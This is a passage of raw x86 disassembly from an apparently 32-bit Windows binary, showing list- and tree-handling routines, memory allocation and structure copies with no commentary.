   1a5b1:	mov    DWORD PTR [ecx],eax
   1a5b3:	mov    DWORD PTR [eax+0x8],edx
   1a5b6:	mov    DWORD PTR [edx+0x4],eax
   1a5b9:	pop    ebp
   1a5ba:	ret    0x4
   1a5bd:	int3   
   1a5be:	int3   
   1a5bf:	int3   
   1a5c0:	int3   
   1a5c1:	int3   
   1a5c2:	mov    edi,edi
   1a5c4:	push   esi
   1a5c5:	mov    esi,ecx
   1a5c7:	mov    ecx,DWORD PTR [esi]
   1a5c9:	cmp    DWORD PTR [ecx+0x14],0x0
   1a5cd:	jne    0x1a5dc
   1a5cf:	mov    eax,DWORD PTR [ecx+0x4]
   1a5d2:	cmp    DWORD PTR [eax+0x4],ecx
   1a5d5:	jne    0x1a5dc
   1a5d7:	mov    eax,DWORD PTR [ecx+0x8]
   1a5da:	jmp    0x1a5f9
   1a5dc:	mov    eax,DWORD PTR [ecx]
   1a5de:	cmp    eax,DWORD PTR ds:0x7f89c
   1a5e4:	je     0x1a5f2
   1a5e6:	push   eax
   1a5e7:	call   0x1a38e
   1a5ec:	jmp    0x1a5f9
   1a5ee:	mov    DWORD PTR [esi],eax
   1a5f0:	mov    ecx,eax
   1a5f2:	mov    eax,DWORD PTR [ecx+0x4]
   1a5f5:	cmp    ecx,DWORD PTR [eax]
   1a5f7:	je     0x1a5ee
   1a5f9:	mov    DWORD PTR [esi],eax
   1a5fb:	pop    esi
   1a5fc:	ret    
   1a5fd:	int3   
   1a5fe:	int3   
   1a5ff:	int3   
   1a600:	int3   
   1a601:	int3   
   1a602:	mov    edi,edi
   1a604:	push   ebp
   1a605:	mov    ebp,esp
   1a607:	mov    eax,DWORD PTR [ecx+0x4]
   1a60a:	push   esi
   1a60b:	mov    esi,DWORD PTR [eax+0x4]
   1a60e:	push   edi
   1a60f:	mov    edi,eax
   1a611:	jmp    0x1a62c
   1a613:	push   DWORD PTR [ebp+0x8]
   1a616:	lea    eax,[esi+0xc]
   1a619:	push   eax
   1a61a:	call   0x19804
   1a61f:	test   al,al
   1a621:	je     0x1a628
   1a623:	mov    esi,DWORD PTR [esi+0x8]
   1a626:	jmp    0x1a62c
   1a628:	mov    edi,esi
   1a62a:	mov    esi,DWORD PTR [esi]
   1a62c:	cmp    esi,DWORD PTR ds:0x7f89c
   1a632:	jne    0x1a613
   1a634:	mov    eax,edi
   1a636:	pop    edi
   1a637:	pop    esi
   1a638:	pop    ebp
   1a639:	ret    0x4
   1a63c:	int3   
   1a63d:	int3   
   1a63e:	int3   
   1a63f:	int3   
   1a640:	int3   
   1a641:	int3   
   1a642:	mov    edi,edi
   1a644:	push   ebp
   1a645:	mov    ebp,esp
   1a647:	mov    eax,DWORD PTR [ecx+0x4]
   1a64a:	push   esi
   1a64b:	mov    esi,DWORD PTR [eax+0x4]
   1a64e:	push   edi
   1a64f:	mov    edi,eax
   1a651:	jmp    0x1a66c
   1a653:	lea    eax,[esi+0xc]
   1a656:	push   eax
   1a657:	push   DWORD PTR [ebp+0x8]
   1a65a:	call   0x19804
   1a65f:	test   al,al
   1a661:	je     0x1a669
   1a663:	mov    edi,esi
   1a665:	mov    esi,DWORD PTR [esi]
   1a667:	jmp    0x1a66c
   1a669:	mov    esi,DWORD PTR [esi+0x8]
   1a66c:	cmp    esi,DWORD PTR ds:0x7f89c
   1a672:	jne    0x1a653
   1a674:	mov    eax,edi
   1a676:	pop    edi
   1a677:	pop    esi
   1a678:	pop    ebp
   1a679:	ret    0x4
   1a67c:	int3   
   1a67d:	int3   
   1a67e:	int3   
   1a67f:	int3   
   1a680:	int3   
   1a681:	int3   
   1a682:	mov    edi,edi
   1a684:	push   ebp
   1a685:	mov    ebp,esp
   1a687:	mov    ecx,DWORD PTR [ebp+0x8]
   1a68a:	test   ecx,ecx
   1a68c:	je     0x1a696
   1a68e:	push   DWORD PTR [ebp+0xc]
   1a691:	call   0x129aa
   1a696:	pop    ebp
   1a697:	ret    0x8
   1a69a:	int3   
   1a69b:	int3   
   1a69c:	int3   
   1a69d:	int3   
   1a69e:	int3   
   1a69f:	int3   
   1a6a0:	mov    edi,edi
   1a6a2:	push   ebp
   1a6a3:	mov    ebp,esp
   1a6a5:	mov    ecx,DWORD PTR [ebp+0x8]
   1a6a8:	push   0x0
   1a6aa:	call   0x1a454
   1a6af:	pop    ebp
   1a6b0:	ret    0x4
   1a6b3:	int3   
   1a6b4:	int3   
   1a6b5:	int3   
   1a6b6:	int3   
   1a6b7:	int3   
   1a6b8:	mov    edi,edi
   1a6ba:	push   ebp
   1a6bb:	mov    ebp,esp
   1a6bd:	push   edi
   1a6be:	mov    edi,DWORD PTR [ebp+0xc]
   1a6c1:	cmp    DWORD PTR [ebp+0x8],edi
   1a6c4:	je     0x1a6da
   1a6c6:	push   esi
   1a6c7:	mov    esi,DWORD PTR [ebp+0x10]
   1a6ca:	inc    DWORD PTR [esi]
   1a6cc:	lea    ecx,[ebp+0x8]
   1a6cf:	call   0x1a3d2
   1a6d4:	cmp    DWORD PTR [ebp+0x8],edi
   1a6d7:	jne    0x1a6ca
   1a6d9:	pop    esi
   1a6da:	pop    edi
   1a6db:	pop    ebp
   1a6dc:	ret    
   1a6dd:	int3   
   1a6de:	int3   
   1a6df:	int3   
   1a6e0:	int3   
   1a6e1:	int3   
   1a6e2:	mov    edi,edi
   1a6e4:	push   ebp
   1a6e5:	mov    ebp,esp
   1a6e7:	mov    eax,DWORD PTR [ebp+0xc]
   1a6ea:	mov    ecx,DWORD PTR [eax+0x34]
   1a6ed:	lea    eax,[ecx+eax*1+0x40]
   1a6f1:	mov    ecx,DWORD PTR [ebp+0x8]
   1a6f4:	push   0xffffffff
   1a6f6:	push   eax
   1a6f7:	call   0x1298a
   1a6fc:	mov    eax,DWORD PTR [ebp+0x8]
   1a6ff:	pop    ebp
   1a700:	ret    0x8
   1a703:	int3   
   1a704:	int3   
   1a705:	int3   
   1a706:	int3   
   1a707:	int3   
   1a708:	mov    edi,edi
   1a70a:	push   ebp
   1a70b:	mov    ebp,esp
   1a70d:	mov    eax,DWORD PTR [ebp+0xc]
   1a710:	mov    ecx,DWORD PTR [eax+0x38]
   1a713:	lea    eax,[ecx+eax*1+0x40]
   1a717:	mov    ecx,DWORD PTR [ebp+0x8]
   1a71a:	push   0xffffffff
   1a71c:	push   eax
   1a71d:	call   0x1298a
   1a722:	mov    eax,DWORD PTR [ebp+0x8]
   1a725:	pop    ebp
   1a726:	ret    0x8
   1a729:	int3   
   1a72a:	int3   
   1a72b:	int3   
   1a72c:	int3   
   1a72d:	int3   
   1a72e:	mov    edi,edi
   1a730:	push   ebp
   1a731:	mov    ebp,esp
   1a733:	mov    eax,DWORD PTR [ebp+0xc]
   1a736:	mov    ecx,DWORD PTR [eax+0x3c]
   1a739:	lea    eax,[ecx+eax*1+0x40]
   1a73d:	mov    ecx,DWORD PTR [ebp+0x8]
   1a740:	push   0xffffffff
   1a742:	push   eax
   1a743:	call   0x1298a
   1a748:	mov    eax,DWORD PTR [ebp+0x8]
   1a74b:	pop    ebp
   1a74c:	ret    0x8
   1a74f:	int3   
   1a750:	int3   
   1a751:	int3   
   1a752:	int3   
   1a753:	int3   
   1a754:	mov    edi,edi
   1a756:	push   ebp
   1a757:	mov    ebp,esp
   1a759:	sub    esp,0x1c
   1a75c:	mov    eax,ds:0x7f894
   1a761:	and    DWORD PTR [ebp-0x4],0x0
   1a765:	push   ebx
   1a766:	mov    ebx,DWORD PTR [ebp+0x8]
   1a769:	push   esi
   1a76a:	push   edi
   1a76b:	lea    esi,[eax+0x4]
   1a76e:	mov    edi,ebx
   1a770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a774:	lea    esi,[eax+0x14]
   1a777:	jmp    0x1a7d4
   1a779:	push   DWORD PTR [ebp+0xc]
   1a77c:	mov    eax,DWORD PTR [ebx+0x8]
   1a77f:	push   DWORD PTR [eax]
   1a781:	or     DWORD PTR [ebp-0x4],0x1
   1a785:	lea    eax,[ebp-0xc]
   1a788:	push   eax
   1a789:	call   0x1a72e
   1a78e:	push   eax
   1a78f:	call   0x19814
   1a794:	test   al,al
   1a796:	je     0x1a7a7
   1a798:	mov    eax,DWORD PTR [ebx+0x8]
   1a79b:	mov    eax,DWORD PTR [eax]
   1a79d:	cmp    BYTE PTR [eax+0x1c],0x0
   1a7a1:	mov    BYTE PTR [ebp+0xb],0x1
   1a7a5:	jne    0x1a7ab
   1a7a7:	mov    BYTE PTR [ebp+0xb],0x0
   1a7ab:	test   BYTE PTR [ebp-0x4],0x1
   1a7af:	je     0x1a7be
   1a7b1:	push   DWORD PTR [ebp-0xc]
   1a7b4:	and    DWORD PTR [ebp-0x4],0xfffffffe
   1a7b8:	call   0x10a9a
   1a7bd:	pop    ecx
   1a7be:	cmp    BYTE PTR [ebp+0xb],0x0
   1a7c2:	jne    0x1a7e3
   1a7c4:	mov    ecx,ebx
   1a7c6:	call   0x1a334
   1a7cb:	mov    esi,DWORD PTR ds:0x7f894
   1a7d1:	add    esi,0x14
   1a7d4:	mov    eax,DWORD PTR [ebx+0x8]
   1a7d7:	lea    edi,[ebp-0x1c]
   1a7da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7de:	cmp    eax,DWORD PTR [ebp-0x14]
   1a7e1:	jne    0x1a779
   1a7e3:	pop    edi
   1a7e4:	pop    esi
   1a7e5:	mov    eax,ebx
   1a7e7:	pop    ebx
   1a7e8:	leave  
   1a7e9:	ret    0x8
   1a7ec:	int3   
   1a7ed:	int3   
   1a7ee:	int3   
   1a7ef:	int3   
   1a7f0:	int3   
   1a7f1:	int3   
   1a7f2:	mov    edi,edi
   1a7f4:	push   ebp
   1a7f5:	mov    ebp,esp
   1a7f7:	sub    esp,0x28
   1a7fa:	mov    eax,DWORD PTR [ebp+0x8]
   1a7fd:	push   ebx
   1a7fe:	push   esi
   1a7ff:	push   edi
   1a800:	lea    esi,[eax+0x4]
   1a803:	mov    DWORD PTR [ebp-0x8],esi
   1a806:	lea    edi,[ebp-0x18]
   1a809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a80a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a80b:	and    DWORD PTR [ebp-0x4],0x0
   1a80f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a810:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a811:	lea    ecx,[eax+0x14]
   1a814:	mov    eax,DWORD PTR [ebp-0x10]
   1a817:	mov    esi,ecx
   1a819:	lea    edi,[ebp-0x28]
   1a81c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a81d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a81e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a81f:	push   0x4
   1a821:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a822:	pop    ebx
   1a823:	mov    DWORD PTR [ebp+0x8],ecx
   1a826:	cmp    eax,DWORD PTR [ebp-0x20]
   1a829:	je     0x1a84b
   1a82b:	mov    esi,ecx
   1a82d:	lea    edi,[ebp-0x28]
   1a830:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a831:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a832:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a834:	mov    eax,DWORD PTR [eax]
   1a836:	add    ebx,DWORD PTR [eax]
   1a838:	inc    DWORD PTR [ebp-0x4]
   1a83b:	lea    ecx,[ebp-0x18]
   1a83e:	call   0x1a334
   1a843:	mov    eax,DWORD PTR [ebp-0x10]
   1a846:	cmp    eax,DWORD PTR [ebp-0x20]
   1a849:	jne    0x1a834
   1a84b:	mov    eax,DWORD PTR [ebp+0xc]
   1a84e:	cmp    ebx,DWORD PTR [eax+0x4]
   1a851:	mov    DWORD PTR [eax+0x4],ebx
   1a854:	jbe    0x1a85e
   1a856:	mov    DWORD PTR [eax],0x1
   1a85c:	jmp    0x1a8a4
   1a85e:	and    DWORD PTR [eax],0x0
   1a861:	mov    esi,DWORD PTR [ebp-0x8]
   1a864:	lea    ebx,[eax+0x8]
   1a867:	mov    eax,DWORD PTR [ebp-0x4]
   1a86a:	mov    DWORD PTR [ebx],eax
   1a86c:	lea    edi,[ebp-0x28]
   1a86f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a872:	add    ebx,0x4
   1a875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a876:	jmp    0x1a892
   1a878:	mov    eax,DWORD PTR [esi]
   1a87a:	push   DWORD PTR [eax]
   1a87c:	push   eax
   1a87d:	push   ebx
   1a87e:	call   0x1dade
   1a883:	mov    eax,DWORD PTR [esi]
   1a885:	add    ebx,DWORD PTR [eax]
   1a887:	add    esp,0xc
   1a88a:	lea    ecx,[ebp-0x28]
   1a88d:	call   0x1a334
   1a892:	mov    esi,DWORD PTR [ebp+0x8]
   1a895:	lea    edi,[ebp-0x18]
   1a898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a899:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a89a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a89b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a89c:	mov    esi,DWORD PTR [ebp-0x20]
   1a89f:	cmp    esi,DWORD PTR [ebp-0x10]
   1a8a2:	jne    0x1a878
   1a8a4:	pop    edi
   1a8a5:	pop    esi
   1a8a6:	pop    ebx
   1a8a7:	leave  
   1a8a8:	ret    0x8
   1a8ab:	int3   
   1a8ac:	int3   
   1a8ad:	int3   
   1a8ae:	int3   
   1a8af:	int3   
   1a8b0:	push   0x8
   1a8b2:	push   0x7e0b0
   1a8b7:	call   0x1db1c
   1a8bc:	xor    esi,esi
   1a8be:	push   esi
   1a8bf:	push   esi
   1a8c0:	push   esi
   1a8c1:	push   esi
   1a8c2:	push   0x7f86c
   1a8c7:	call   DWORD PTR ds:0x1f028
   1a8cd:	cmp    eax,esi
   1a8cf:	jl     0x1a910
   1a8d1:	mov    DWORD PTR [ebp-0x4],esi
   1a8d4:	push   DWORD PTR [ebp+0x8]
   1a8d7:	push   DWORD PTR ds:0x7f894
   1a8dd:	call   0x1a7f2
   1a8e2:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1a8e9:	jmp    0x1a904
   1a8eb:	xor    eax,eax
   1a8ed:	inc    eax
   1a8ee:	ret    
   1a8ef:	mov    esp,DWORD PTR [ebp-0x18]
   1a8f2:	mov    eax,DWORD PTR [ebp+0x8]
   1a8f5:	mov    DWORD PTR [eax],0x2
   1a8fb:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1a902:	xor    esi,esi
   1a904:	push   esi
   1a905:	push   0x7f86c
   1a90a:	call   DWORD PTR ds:0x1f024
   1a910:	call   0x1db61
   1a915:	ret    0x4
   1a918:	int3   
   1a919:	int3   
   1a91a:	int3   
   1a91b:	int3   
   1a91c:	int3   
   1a91d:	int3   
   1a91e:	mov    edi,edi
   1a920:	push   ebp
   1a921:	mov    ebp,esp
   1a923:	sub    esp,0x10
   1a926:	push   ebx
   1a927:	mov    ebx,ecx
   1a929:	mov    eax,DWORD PTR [ebx+0x10]
   1a92c:	push   esi
   1a92d:	lea    ecx,[eax+0x4]
   1a930:	push   edi
   1a931:	mov    DWORD PTR [ebx+0x10],ecx
   1a934:	push   DWORD PTR [eax]
   1a936:	call   0x10a9a
   1a93b:	xor    eax,eax
   1a93d:	pop    ecx
   1a93e:	cmp    DWORD PTR [ebx+0x2c],eax
   1a941:	jne    0x1a96e
   1a943:	mov    DWORD PTR [ebp-0x10],eax
   1a946:	mov    DWORD PTR [ebp-0xc],eax
   1a949:	mov    DWORD PTR [ebp-0x8],eax
   1a94c:	mov    DWORD PTR [ebp-0x4],eax
   1a94f:	lea    edi,[ebx+0x4]
   1a952:	lea    esi,[ebp-0x10]
   1a955:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a957:	push   DWORD PTR [ebx+0x24]
   1a95a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a95b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a95c:	lea    edi,[ebx+0x14]
   1a95f:	lea    esi,[ebp-0x10]
   1a962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a963:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a966:	call   0x10a9a
   1a96b:	pop    ecx
   1a96c:	jmp    0x1a985
   1a96e:	mov    eax,DWORD PTR [ebx+0x10]
   1a971:	push   eax
   1a972:	push   DWORD PTR [eax]
   1a974:	lea    ecx,[ebp-0x10]
   1a977:	call   0x1a362
   1a97c:	lea    edi,[ebx+0x4]
   1a97f:	mov    esi,eax
   1a981:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a984:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a985:	pop    edi
   1a986:	pop    esi
   1a987:	pop    ebx
   1a988:	leave  
   1a989:	ret    
   1a98a:	int3   
   1a98b:	int3   
   1a98c:	int3   
   1a98d:	int3   
   1a98e:	int3   
   1a98f:	int3   
   1a990:	mov    edi,edi
   1a992:	push   ebp
   1a993:	mov    ebp,esp
   1a995:	mov    eax,DWORD PTR [ebp+0xc]
   1a998:	push   esi
   1a999:	mov    esi,ecx
   1a99b:	mov    ecx,DWORD PTR [eax]
   1a99d:	mov    DWORD PTR [ebp+0xc],ecx
   1a9a0:	mov    ecx,DWORD PTR [eax+0x4]
   1a9a3:	mov    edx,DWORD PTR [eax]
   1a9a5:	mov    DWORD PTR [ecx],edx
   1a9a7:	mov    ecx,DWORD PTR [eax]
   1a9a9:	mov    edx,DWORD PTR [eax+0x4]
   1a9ac:	push   eax
   1a9ad:	mov    DWORD PTR [ecx+0x4],edx
   1a9b0:	call   0x10a9a
   1a9b5:	mov    eax,DWORD PTR [ebp+0x8]
   1a9b8:	dec    DWORD PTR [esi+0x8]
   1a9bb:	pop    ecx
   1a9bc:	mov    ecx,DWORD PTR [ebp+0xc]
   1a9bf:	mov    DWORD PTR [eax],ecx
   1a9c1:	pop    esi
   1a9c2:	pop    ebp
   1a9c3:	ret    0x8
   1a9c6:	int3   
   1a9c7:	int3   
   1a9c8:	int3   
   1a9c9:	int3   
   1a9ca:	int3   
   1a9cb:	int3   
   1a9cc:	mov    edi,edi
   1a9ce:	push   ebp
   1a9cf:	mov    ebp,esp
   1a9d1:	push   ecx
   1a9d2:	push   esi
   1a9d3:	mov    esi,ecx
   1a9d5:	jmp    0x1a9ea
   1a9d7:	mov    eax,ecx
   1a9d9:	mov    ecx,DWORD PTR [ecx]
   1a9db:	push   eax
   1a9dc:	lea    eax,[ebp-0x4]
   1a9df:	mov    DWORD PTR [ebp+0xc],ecx
   1a9e2:	push   eax
   1a9e3:	mov    ecx,esi
   1a9e5:	call   0x1a990
   1a9ea:	mov    ecx,DWORD PTR [ebp+0xc]
   1a9ed:	cmp    ecx,DWORD PTR [ebp+0x10]
   1a9f0:	jne    0x1a9d7
   1a9f2:	mov    eax,DWORD PTR [ebp+0x8]
   1a9f5:	mov    DWORD PTR [eax],ecx
   1a9f7:	pop    esi
   1a9f8:	leave  
   1a9f9:	ret    0xc
   1a9fc:	int3   
   1a9fd:	int3   
   1a9fe:	int3   
   1a9ff:	int3   
   1aa00:	int3   
   1aa01:	int3   
   1aa02:	mov    edi,edi
   1aa04:	push   ebp
   1aa05:	mov    ebp,esp
   1aa07:	push   0x0
   1aa09:	push   0xc
   1aa0b:	call   0x11618
   1aa10:	mov    ecx,DWORD PTR [ebp+0x8]
   1aa13:	test   ecx,ecx
   1aa15:	jne    0x1aa19
   1aa17:	mov    ecx,eax
   1aa19:	mov    DWORD PTR [eax],ecx
   1aa1b:	mov    ecx,DWORD PTR [ebp+0xc]
   1aa1e:	test   ecx,ecx
   1aa20:	jne    0x1aa24
   1aa22:	mov    ecx,eax
   1aa24:	mov    DWORD PTR [eax+0x4],ecx
   1aa27:	pop    ebp
   1aa28:	ret    0x8
   1aa2b:	int3   
   1aa2c:	int3   
   1aa2d:	int3   
   1aa2e:	int3   
   1aa2f:	int3   
   1aa30:	mov    edi,edi
   1aa32:	push   esi
   1aa33:	mov    esi,ecx
   1aa35:	mov    eax,DWORD PTR [esi+0x28]
   1aa38:	shl    eax,0x2
   1aa3b:	push   0x0
   1aa3d:	push   eax
   1aa3e:	call   0x11618
   1aa43:	mov    DWORD PTR [esi+0x24],eax
   1aa46:	pop    esi
   1aa47:	ret    
   1aa48:	int3   
   1aa49:	int3   
   1aa4a:	int3   
   1aa4b:	int3   
   1aa4c:	int3   
   1aa4d:	int3   
   1aa4e:	mov    edi,edi
   1aa50:	push   ebp
   1aa51:	mov    ebp,esp
   1aa53:	push   ebx
   1aa54:	push   esi
   1aa55:	push   edi
   1aa56:	mov    edi,DWORD PTR [ebp+0x8]
   1aa59:	mov    eax,0xfffffff
   1aa5e:	mov    esi,ecx
   1aa60:	cmp    edi,eax
   1aa62:	jbe    0x1aa66
   1aa64:	mov    edi,eax
   1aa66:	mov    eax,edi
   1aa68:	push   0x0
   1aa6a:	shl    eax,0x2
   1aa6d:	push   eax
   1aa6e:	call   0x11618
   1aa73:	mov    ebx,eax
   1aa75:	mov    eax,edi
   1aa77:	shr    eax,0x2
   1aa7a:	lea    eax,[ebx+eax*4]
   1aa7d:	push   eax
   1aa7e:	mov    DWORD PTR [ebp+0x8],eax
   1aa81:	mov    eax,DWORD PTR [esi+0x20]
   1aa84:	add    eax,0x4
   1aa87:	push   eax
   1aa88:	push   DWORD PTR [esi+0x10]
   1aa8b:	call   0x1a408
   1aa90:	push   DWORD PTR [esi+0x24]
   1aa93:	call   0x10a9a
   1aa98:	mov    eax,DWORD PTR [ebp+0x8]
   1aa9b:	pop    ecx
   1aa9c:	mov    DWORD PTR [esi+0x28],edi
   1aa9f:	pop    edi
   1aaa0:	mov    DWORD PTR [esi+0x24],ebx
   1aaa3:	pop    esi
   1aaa4:	pop    ebx
   1aaa5:	pop    ebp
   1aaa6:	ret    0x4
   1aaa9:	int3   
   1aaaa:	int3   
   1aaab:	int3   
   1aaac:	int3   
   1aaad:	int3   
   1aaae:	mov    edi,edi
   1aab0:	push   ebp
   1aab1:	mov    ebp,esp
   1aab3:	push   ecx
   1aab4:	push   DWORD PTR [ebp-0x4]
   1aab7:	push   DWORD PTR [ebp+0x10]
   1aaba:	push   DWORD PTR [ebp+0xc]
   1aabd:	push   DWORD PTR [ebp+0x8]
   1aac0:	call   0x1a6b8
   1aac5:	add    esp,0x10
   1aac8:	leave  
   1aac9:	ret    
   1aaca:	int3   
   1aacb:	int3   
   1aacc:	int3   
   1aacd:	int3   
   1aace:	int3   
   1aacf:	int3   
   1aad0:	mov    edi,edi
   1aad2:	push   ebp
   1aad3:	mov    ebp,esp
   1aad5:	sub    esp,0x28
   1aad8:	push   ebx
   1aad9:	mov    ebx,DWORD PTR [ebp+0x8]
   1aadc:	push   esi
   1aadd:	push   edi
   1aade:	push   0xffffffff
   1aae0:	push   ebx
   1aae1:	lea    ecx,[ebp-0x8]
   1aae4:	call   0x110ae
   1aae9:	and    DWORD PTR [ebx],0x0
   1aaec:	lea    eax,[ebp-0x8]
   1aaef:	push   eax
   1aaf0:	lea    eax,[ebp-0x18]
   1aaf3:	push   eax
   1aaf4:	call   0x1a754
   1aaf9:	mov    esi,DWORD PTR ds:0x7f894
   1aaff:	mov    eax,DWORD PTR [ebp-0x10]
   1ab02:	push   DWORD PTR [ebp-0x8]
   1ab05:	add    esi,0x14
   1ab08:	lea    edi,[ebp-0x28]
   1ab0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ab0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ab0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ab0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ab0f:	cmp    eax,DWORD PTR [ebp-0x20]
   1ab12:	je     0x1ab1c
   1ab14:	mov    eax,DWORD PTR [eax]
   1ab16:	mov    eax,DWORD PTR [eax+0x20]
   1ab19:	inc    eax
   1ab1a:	mov    DWORD PTR [ebx],eax
   1ab1c:	call   0x10a9a
   1ab21:	pop    ecx
   1ab22:	pop    edi
   1ab23:	pop    esi
   1ab24:	pop    ebx
   1ab25:	leave  
   1ab26:	ret    0x4
   1ab29:	int3   
   1ab2a:	int3   
   1ab2b:	int3   
   1ab2c:	int3   
   1ab2d:	int3   
   1ab2e:	add    DWORD PTR [ecx+0xc],0x4
   1ab32:	dec    DWORD PTR [ecx+0x2c]
   1ab35:	mov    eax,DWORD PTR [ecx+0xc]
   1ab38:	je     0x1ab3f
   1ab3a:	cmp    eax,DWORD PTR [ecx+0x8]
   1ab3d:	jne    0x1ab44
   1ab3f:	jmp    0x1a91e
   1ab44:	ret    
   1ab45:	int3   
   1ab46:	int3   
   1ab47:	int3   
   1ab48:	int3   
   1ab49:	int3   
   1ab4a:	mov    edi,edi
   1ab4c:	push   esi
   1ab4d:	push   0x0
   1ab4f:	push   0xc
   1ab51:	mov    esi,ecx
   1ab53:	call   0x11618
   1ab58:	mov    DWORD PTR [eax],eax
   1ab5a:	mov    DWORD PTR [eax+0x4],eax
   1ab5d:	and    DWORD PTR [esi+0x8],0x0
   1ab61:	mov    DWORD PTR [esi+0x4],eax
   1ab64:	mov    eax,esi
   1ab66:	pop    esi
   1ab67:	ret    0x4
   1ab6a:	int3   
   1ab6b:	int3   
   1ab6c:	int3   
   1ab6d:	int3   
   1ab6e:	int3   
   1ab6f:	int3   
   1ab70:	mov    edi,edi
   1ab72:	push   ebp
   1ab73:	mov    ebp,esp
   1ab75:	push   ecx
   1ab76:	push   esi
   1ab77:	mov    esi,ecx
   1ab79:	mov    eax,DWORD PTR [esi+0x4]
   1ab7c:	mov    ecx,DWORD PTR [eax]
   1ab7e:	push   eax
   1ab7f:	push   ecx
   1ab80:	lea    eax,[ebp-0x4]
   1ab83:	push   eax
   1ab84:	mov    ecx,esi
   1ab86:	call   0x1a9cc
   1ab8b:	push   DWORD PTR [esi+0x4]
   1ab8e:	call   0x10a9a
   1ab93:	and    DWORD PTR [esi+0x4],0x0
   1ab97:	and    DWORD PTR [esi+0x8],0x0
   1ab9b:	pop    ecx
   1ab9c:	pop    esi
   1ab9d:	leave  
   1ab9e:	ret    
   1ab9f:	int3   
   1aba0:	int3   
   1aba1:	int3   
   1aba2:	int3   
   1aba3:	int3   
   1aba4:	mov    edi,edi
   1aba6:	push   ebp
   1aba7:	mov    ebp,esp
   1aba9:	push   ecx
   1abaa:	mov    eax,DWORD PTR [ecx+0x4]
   1abad:	push   DWORD PTR [eax]
   1abaf:	lea    eax,[ebp-0x4]
   1abb2:	push   eax
   1abb3:	call   0x1a990
   1abb8:	leave  
   1abb9:	ret    
   1abba:	int3   
   1abbb:	int3   
   1abbc:	int3   
   1abbd:	int3   
   1abbe:	int3   
   1abbf:	int3   
   1abc0:	mov    edi,edi
   1abc2:	push   ebp
   1abc3:	mov    ebp,esp
   1abc5:	sub    esp,0x18
   1abc8:	push   ebx
   1abc9:	push   esi
   1abca:	push   edi
   1abcb:	push   0x0
   1abcd:	push   0x400
   1abd2:	mov    ebx,ecx
   1abd4:	call   0x1a432
   1abd9:	cmp    DWORD PTR [ebx+0x2c],0x0
   1abdd:	mov    esi,eax
   1abdf:	mov    DWORD PTR [ebp-0x8],esi
   1abe2:	jne    0x1ac19
   1abe4:	mov    ecx,ebx
   1abe6:	mov    DWORD PTR [ebx+0x28],0x2
   1abed:	call   0x1aa30
   1abf2:	mov    eax,DWORD PTR [ebx+0x24]
   1abf5:	mov    DWORD PTR [eax+0x4],esi
   1abf8:	mov    eax,DWORD PTR [ebx+0x24]
   1abfb:	add    eax,0x4
   1abfe:	push   eax
   1abff:	add    esi,0x800
   1ac05:	push   esi
   1ac06:	lea    ecx,[ebp-0x18]
   1ac09:	call   0x1a362
   1ac0e:	lea    edi,[ebx+0x4]
   1ac11:	mov    esi,eax
   1ac13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac17:	jmp    0x1ac77
   1ac19:	mov    ecx,DWORD PTR [ebx+0x28]
   1ac1c:	mov    edx,DWORD PTR [ebx+0x24]
   1ac1f:	mov    eax,DWORD PTR [ebx+0x20]
